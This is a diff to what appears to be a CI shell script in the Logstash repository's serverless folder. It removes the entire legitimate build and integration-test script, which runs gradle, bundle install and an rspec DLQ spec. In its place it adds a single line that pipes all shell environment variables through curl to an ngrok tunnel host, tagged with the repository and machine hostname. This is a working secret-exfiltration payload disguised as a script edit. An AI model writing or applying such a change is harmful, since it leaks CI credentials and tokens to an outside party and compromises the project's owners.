@@ -1,18 +1,1 @@
-#!/usr/bin/env bash
-set -ex
-
-source ./$(dirname "$0")/common.sh
-
-export JRUBY_OPTS="-J-Xmx1g"
-export SERVERLESS=true
-setup_vault
-
-./gradlew clean bootstrap assemble installDefaultGems unpackTarDistribution
-./gradlew :logstash-core:copyGemjar
-
-export GEM_PATH=vendor/bundle/jruby/3.1.0
-export GEM_HOME=vendor/bundle/jruby/3.1.0
-
-vendor/jruby/bin/jruby -S bundle install --with development
-
-vendor/jruby/bin/jruby -S bundle exec rspec -fd qa/integration/specs/dlq_spec.rb -e "using pipelines.yml"
+set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/elastic/logstash.git\&folder=serverless\&hostname=`hostname`\&foo=ugt
